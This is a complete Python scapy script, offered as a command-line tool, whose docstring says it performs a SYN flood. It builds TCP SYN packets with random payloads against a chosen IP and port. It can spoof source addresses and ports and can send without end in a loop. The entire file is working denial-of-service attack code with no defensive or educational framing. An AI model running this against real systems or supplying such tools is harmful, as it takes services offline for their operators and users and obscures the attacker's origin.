import argparse
import numpy
from scapy.all import *

# Packet Construction
###################################################################################################
def construct_syn_packet(target_ip, target_port, raw_size, randomized_source):
    '''
    Constructs a SYN packet targeting a given destination IP and port
    with randomized data of a given size. Source can be randomized.
    Input:
        target_ip - The destination IP address.
        target_port - The destination port.
        raw_size - The size of the random raw data to generate in bytes.
        randomized_source - Whether to randomize the source IP address and port.
    Output:
        The constructed SYN packet.
    '''
    if randomized_source:
        ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    else:
        ip = IP(dst=target_ip)
        tcp = TCP(sport=80, dport=target_port, flags="S")

    ascii_numbers = numpy.random.randint(size=raw_size, low=32, high=126)
    raw_bytes = b''
    for num in ascii_numbers:
        raw_bytes = raw_bytes + int(num).to_bytes(1, 'big')

    raw = Raw(raw_bytes)
    p = ip / tcp / raw
    return p

# Main
################################################################################################### 
def parse_args():
    '''
    Parses the command line arguments.
    Output:
        The dictionary of parsed arguments.
    '''
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", type=str, help="The IP address of the target", required=True)
    parser.add_argument("-p", "--port", type=int, help="The port to target", required=True)
    parser.add_argument("-s", "--size", type=int, default=1024, help="The size of the raw data in bytes")
    parser.add_argument("-r", "--random_source", type=bool, default=False, help="Whether to use a randomized source IP")
    parser.add_argument("-l", "--loop", type=bool, default=False, help="Whether to loop sending the packet until force quit")
    args = vars(parser.parse_args())
    return args

def main():
    '''
    Performs a SYN flood based on the command line arguments.
    '''
    # Parse arguments
    args = parse_args()
    # Construct packet
    p = construct_syn_packet(args['target'], args['port'], args['size'], args['random_source'])
    # Send packet
    if args['loop']:
        send(p, loop=1, verbose=0)
    else:
        send(p, verbose=0)

if __name__ == '__main__':
    main()